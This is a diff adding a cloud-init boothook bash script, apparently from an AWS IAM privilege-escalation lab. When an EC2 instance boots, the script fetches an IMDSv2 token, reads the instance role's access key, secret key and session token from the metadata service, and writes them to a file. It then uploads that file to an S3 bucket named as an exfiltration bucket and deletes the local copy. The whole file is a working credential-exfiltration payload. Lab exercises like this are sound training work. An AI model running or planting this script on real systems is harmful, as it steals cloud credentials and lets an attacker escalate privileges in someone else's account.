@@ -1,0 +1,29 @@
+#cloud-boothook
+#!/bin/bash
+
+# Fetch IMDSv2 token (IMDSv1 also works in this lab)
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+CREDENTIALS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}")
+
+ACCESS_KEY=$(echo "$CREDENTIALS" | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
+SECRET_KEY=$(echo "$CREDENTIALS" | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
+SESSION_TOKEN=$(echo "$CREDENTIALS" | python3 -c "import sys,json; print(json.load(sys.stdin)['SessionToken'])")
+
+REGION="us-east-1"
+BUCKET_NAME="iam-privesc-ec2-xt055mvh-exfil-bucket"   # from terraform output
+
+cat <<EOF > /tmp/creds.txt
+export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
+export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
+export AWS_SESSION_TOKEN="$SESSION_TOKEN"
+export AWS_DEFAULT_REGION="$REGION"
+EOF
+
+aws s3 cp /tmp/creds.txt "s3://${BUCKET_NAME}/creds.txt"
+rm -f /tmp/creds.txt
